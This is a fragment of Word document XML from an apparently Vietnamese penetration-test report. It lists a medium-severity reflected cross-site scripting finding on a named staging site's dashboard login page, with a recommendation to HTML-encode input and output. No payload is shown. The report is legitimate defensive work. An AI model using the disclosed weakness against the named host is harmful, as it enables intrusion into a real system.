            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="358ACB19" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="289E5BAB" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pP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327"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5DE41AD1" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5E2F83F0" w14:textId="3A58D06B" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VulnDetailsName]]:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FE57FB4" w14:textId="0CF72CA0" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VulnDetailsData]]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0260FD5A" w14:textId="64EEFEEB" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[HighVulnDetails.image-Image]:from-resource:maxSize(15):unprocessed]</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="12E5BBD1" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809"/>
    <w:p w14:paraId="1262FD05" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A917637" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MEDIUM RISK FINDINGS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39710E2C" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidRPr="00CC4809" w:rsidSect="00CC4809">
          <w:footerReference w:type="default" r:id="rId22"/>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="413980EE" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00B25F11" w:rsidRDefault="00CC4809" w:rsidP="00760616">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r w:rsidRPr="00B25F11">
        <w:t>Testing for Reflected Cross site scripting (OTG-INPVAL-001)</w:t>
      </w:r>
      <w:r w:rsidR="000316BB">
        <w:t/>
      </w:r>
      <w:r w:rsidRPr="00B25F11">
        <w:t/>
      </w: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395"/>
        <w:gridCol w:w="2695"/>
        <w:gridCol w:w="1868"/>
        <w:gridCol w:w="2369"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5965EA99" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="530"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="56140739" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY INFORMATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5F079BF3" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="350"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="35E5E811" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CATEGORY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5004B103" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[Medium.Vuln.Category_Vuln]:unprocessed]</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="01CBA2BA" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="41F6ADA4" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>DESCRIPTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2F7049CA" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Chức năng Login Dashboard không lọc đầu vào, kẻ tấn công có thể chèn các mã html và javascript tùy ý để thực thi script độc hại</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="3C78CBA9" w14:textId="77777777" w:rsidTr="00CC4809">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7C2E72F6" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>SEVERITY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1CFD4CD2" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="4D9638CE" w14:textId="77777777" w:rsidTr="00CC4809">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0129F527" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>IMPACT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2695" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="41AE9C14" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1868" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="62A68CF9" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>LIKELIHOOD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2369" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2A7B0C5E" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="76B12BA1" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="170E1BB1" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>RECOMMENDATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="13491B83" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Thực hiện mã hóa html cho đầu vào và đầu ra</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5EF1BC48" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="05E3C4CA" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>REFERENCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0E013242" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="3E098A7F" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7AD0F9BC" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY DETAIL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="3A8534DA" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0F1304E1" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>FUNCTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="67AEDDF0" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Dashboard Login</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5B995E53" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="234961EB" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>AFFECTED URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="513E3C3A" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>https://staging2.nguyenkimmall.com:443/dashboard/login.php</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="409FFA3A" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="25C48D84" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
